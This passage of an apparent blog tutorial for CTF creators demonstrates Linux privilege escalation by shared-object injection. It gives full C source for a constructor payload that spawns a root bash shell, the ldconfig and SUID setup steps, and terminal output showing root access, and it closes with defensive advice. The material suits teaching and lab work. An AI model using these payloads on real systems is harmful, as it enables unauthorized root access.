+</span></span></span><span class="line"><span class="cl"><span class="s1">I&#39;</span>m trying to spawn a root shell...
+</span></span><span class="line"><span class="cl">Check your shell!
+</span></span><span class="line"><span class="cl">root@pwn:~/so-files/evil# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,120<span class="o">(</span>lpadmin<span class="o">)</span>,132<span class="o">(</span>lxd<span class="o">)</span>,133<span class="o">(</span>sambashare<span class="o">)</span>,1000 <span class="o">(</span>user<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@pwn:~/so-files/evil# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@pwn:~/so-files/evil# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that we have escalated privileges. However, since we no longer need the file, we can remove it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ sudo rm /etc/ld.so.conf.d/shouldnt_be_here.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We could reload the <code>ld</code> configuration with <code>ldconfig</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ldd /usr/bin/myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffd4cd08000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /tmp/libcustom.so <span class="o">(</span>0x00007f150e0a7000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f150deb5000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f150e0c2000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ sudo ldconfig
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ ldd /usr/bin/myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffeaefb4000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /lib/libcustom.so <span class="o">(</span>0x00007f35cf80a000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f35cf618000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f35cf825000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">user@pwn:~/so-files/evil$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-fake-ldsoconf">Privilege Escalation via Fake ld.so.conf</h1>
+<p>We create our fake <strong>ld.so.conf</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files/evil$ <span class="nb">cd</span> /tmp
+</span></span><span class="line"><span class="cl">user@pwn:/tmp$ <span class="nb">echo</span> <span class="s2">&#34;include /tmp/conf/*&#34;</span> &gt; /tmp/fake.ld.so.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then, we add a configuration file to the location indicated by <strong>fake.ld.so.conf</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:/tmp$ mkdir conf
+</span></span><span class="line"><span class="cl">user@pwn:/tmp$ <span class="nb">echo</span> <span class="s2">&#34;/tmp&#34;</span> &gt; conf/evil.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Finally, we execute <code>ldconfig</code> with the -f option:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:/tmp$ sudo ldconfig -f fake.ld.so.conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now verify that the shared object that is being loaded is the malicious one and execute the binary (<code>myexec</code>):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:/tmp$ ldd /usr/bin/myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffd872a4000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /tmp/libcustom.so <span class="o">(</span>0x00007f9a11ce3000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007f9a11af1000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f9a11cfe000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:/tmp$ /usr/bin/myexec
+</span></span><span class="line"><span class="cl">Message from myexec.c!
+</span></span><span class="line"><span class="cl">I<span class="s1">&#39;m the bad library!
+</span></span></span><span class="line"><span class="cl"><span class="s1">I&#39;</span>m trying to spawn a root shell...
+</span></span><span class="line"><span class="cl">Check your shell!
+</span></span><span class="line"><span class="cl">root@pwn:/tmp# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,120<span class="o">(</span>lpadmin<span class="o">)</span>,132<span class="o">(</span>lxd<span class="o">)</span>,133<span class="o">(</span>sambashare<span class="o">)</span>,1000 <span class="o">(</span>user<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@pwn:/tmp# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@pwn:/tmp# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can escalate privileges, let&rsquo;s exit out of the root shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@pwn:/tmp# <span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we could remove everything:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:/tmp$ rm libcustom.so 
+</span></span><span class="line"><span class="cl">user@pwn:/tmp$ rm fake.ld.so.conf 
+</span></span><span class="line"><span class="cl">user@pwn:/tmp$ sudo rm -rf conf
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Review that the shared object is loading the correct one:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:/tmp$ ldd /usr/bin/myexec
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007ffd07df0000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libcustom.so <span class="o">=</span>&gt; /lib/libcustom.so <span class="o">(</span>0x00007fdf67edb000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	libc.so.6 <span class="o">=</span>&gt; /lib/x86_64-linux-gnu/libc.so.6 <span class="o">(</span>0x00007fdf67ce9000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	/lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007fdf67ef6000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-missing-shared-object">Privilege Escalation via Missing Shared Object</h1>
+<p>Let&rsquo;s navigate to the directory where our <code>.so</code> files are located:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:/tmp$ <span class="nb">cd</span> ~/so-files
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a file named <code>nosuchfile.c</code> which will open a shared object file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ vim nosuchfile.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the following code which prints the &lsquo;Hello&rsquo; string on the screen and opens a dynamic library, in this case, a shared object file named <code>custom.so</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Hello</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">dlopen</span><span class="p">(</span><span class="s">&#34;/home/user/.config/custom.so&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span> <span class="c1">// Load the custom.so shared object.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To compile we have to link against <code>libdl</code>, to do this add the <code>-ldl</code> option:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ gcc -o nosuchfile nosuchfile.c -ldl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now copy this file to the <code>/usr/bin/</code> directory:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ sudo cp nosuchfile /usr/bin/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then add the SUID bit to the <code>/usr/bin/nosuchfile</code> binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user@pwn:~/.config$ sudo chmod u+s /usr/bin/nosuchfile 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Check if the file is not found:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ strace /usr/bin/nosuchfile 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -iE <span class="s2">&#34;open|access|no such file&#34;</span>
+</span></span><span class="line"><span class="cl">access<span class="o">(</span><span class="s2">&#34;/etc/ld.so.preload&#34;</span>, R_OK<span class="o">)</span>      <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
+</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/etc/ld.so.cache&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
+</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/lib/x86_64-linux-gnu/libdl.so.2&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
+</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
+</span></span><span class="line"><span class="cl">openat<span class="o">(</span>AT_FDCWD, <span class="s2">&#34;/home/user/.config/custom.so&#34;</span>, O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> -1 ENOENT <span class="o">(</span>No such file or directory<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create a custom shared object in the directory that the binary <code>nosuchfile</code> looks for the dynamic library, in this case, is <code>/home/user/.config/custom.so</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">vim /home/user/.config/custom.c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Will create a code that executes bash as root:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">inject</span><span class="p">()</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">inject</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Navigate to the directory <code>/home/user/.config</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/so-files$ <span class="nb">cd</span> /home/user/.config
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now compile the <code>custom.c</code> file and ignore the warning message:</p>
+<p>Treat warnings as errors (-Werror), as a developer, we should always try to use this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/.config$ gcc -c -Wall -Werror -fpic custom.c
+</span></span><span class="line"><span class="cl">custom.c: In <span class="k">function</span> ‘inject’:
+</span></span><span class="line"><span class="cl">custom.c:7:2: error: implicit declaration of <span class="k">function</span> ‘setuid’ <span class="o">[</span>-Werror<span class="o">=</span>implicit-function-declaration<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="m">7</span> <span class="p">|</span>  setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">|</span>  ^~~~~~
+</span></span><span class="line"><span class="cl">custom.c:8:2: error: implicit declaration of <span class="k">function</span> ‘setgid’ <span class="o">[</span>-Werror<span class="o">=</span>implicit-function-declaration<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="m">8</span> <span class="p">|</span>  setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">|</span>  ^~~~~~
+</span></span><span class="line"><span class="cl">cc1: all warnings being treated as errors
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>However, because I want to demonstrate this privilege escalation technique, I&rsquo;ll ignore the warnings and just compile the program so I won&rsquo;t use it:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/.config$ gcc -c -Wall -fpic custom.c
+</span></span><span class="line"><span class="cl">custom.c: In <span class="k">function</span> ‘inject’:
+</span></span><span class="line"><span class="cl">custom.c:7:2: warning: implicit declaration of <span class="k">function</span> ‘setuid’ <span class="o">[</span>-Wimplicit-function-declaration<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="m">7</span> <span class="p">|</span>  setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">|</span>  ^~~~~~
+</span></span><span class="line"><span class="cl">custom.c:8:2: warning: implicit declaration of <span class="k">function</span> ‘setgid’ <span class="o">[</span>-Wimplicit-function-declaration<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="m">8</span> <span class="p">|</span>  setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">|</span>  ^~~~~~
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create the shared object:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/.config$ gcc -shared -o custom.so custom.o
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Execute the program and since the program has a SUID bit set, it executes as root, then it loads the evil library, and the evil library spawns a root shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/usr/bin/nosuchfile
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>As we can see we&rsquo;re able to escalate to the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/.config$ /usr/bin/nosuchfile
+</span></span><span class="line"><span class="cl">Hello
+</span></span><span class="line"><span class="cl">root@pwn:~/.config# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,120<span class="o">(</span>lpadmin<span class="o">)</span>,132<span class="o">(</span>lxd<span class="o">)</span>,133<span class="o">(</span>sambashare<span class="o">)</span>,1000 <span class="o">(</span>user<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now remove the SUID bit and try to execute the binary again:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:~/.config$ sudo chmod u-s /usr/bin/nosuchfile 
+</span></span><span class="line"><span class="cl">user@pwn:~/.config$ /usr/bin/nosuchfile
+</span></span><span class="line"><span class="cl">Hello
+</span></span><span class="line"><span class="cl">user@pwn:~/.config$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>For this to work, the binary must have the SUID bit set.</p>
+<h1 id="defend">Defend</h1>
+<p>To defend against these attacks, consider the following measures:</p>
+<ul>
+<li>Avoid setting the SUID bit on executables that are not necessary.</li>
+<li>Ensure that <code>/lib</code> and <code>/usr/lib</code> directories are not writable by others.</li>
+<li>Verify that the directories specified in <code>/etc/ld.so.conf</code> are not writable by others.</li>
+<li>Ensure that the directories specified in <code>LD_LIBRARY_PATH</code> are not writable by others.</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-12-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/privilege-escalation/">Privilege Escalation</a>,&nbsp;<a href="/tags/shared-object-injection/">Shared Object Injection</a>,&nbsp;<a href="/tags/libraries/">Libraries</a>,&nbsp;<a href="/tags/static-libraries/">Static Libraries</a>,&nbsp;<a href="/tags/dynamic-libraries/">Dynamic Libraries</a>,&nbsp;<a href="/tags/gnu-linker/">Gnu Linker</a>,&nbsp;<a href="/tags/ld/">Ld</a>,&nbsp;<a href="/tags/strace/">Strace</a>,&nbsp;<a href="/tags/c-payloads/">C Payloads</a>,&nbsp;<a href="/tags/suid/">Suid</a>,&nbsp;<a href="/tags/defend/">Defend</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux-privesc-sockets/" class="prev" rel="prev" title="Linux Privilege Escalation - Sockets for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Linux Privilege Escalation - Sockets for CTF Creators</a>
+            <a href="/linux-privesc-services/" class="next" rel="next" title="Linux Privilege Escalation - Services for CTF Creators">Linux Privilege Escalation - Services for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
